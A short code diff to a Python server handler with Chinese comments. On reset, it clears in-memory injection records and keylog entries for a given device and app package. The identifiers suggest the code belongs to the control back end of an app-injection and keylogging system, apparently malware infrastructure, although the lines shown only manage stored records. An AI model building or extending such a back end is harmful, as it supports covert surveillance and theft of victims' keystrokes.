@@ -619,6 +619,22 @@ def h_inj_track_act(b, q, a):
                     print('[inj] reset 清理旧记录 dev=%s pkg=%s' % (d, _pkg or '*'), flush=True)
                 except Exception as e:
                     print('[inj] reset 清理失败: %s' % e, flush=True)
+                # 内存里也要清（h_inject_logs 会读 S['inj_records']，不清会"消失一下又回来"）
+                try:
+                    S['inj_records'] = [
+                        r for r in S.get('inj_records', [])
+                        if not (str(r.get('deviceId') or '') == d
+                                and (not _pkg or str(r.get('package') or r.get('pkg') or '') == _pkg))
+                    ]
+                    S['keylogs'] = [
+                        r for r in S.get('keylogs', [])
+                        if not (str(r.get('deviceId') or '') == d
+                                and (not _pkg or str(r.get('pkg') or '') == _pkg))
+                    ]
+                    save()
+                    print('[inj] reset 已清内存记录 dev=%s pkg=%s' % (d, _pkg or '*'), flush=True)
+                except Exception as e:
+                    print('[inj] reset 清内存失败: %s' % e, flush=True)
     except Exception as e:
         print('[inj] track_act 落库失败: %s' % e, flush=True)
     if act == 'inject':
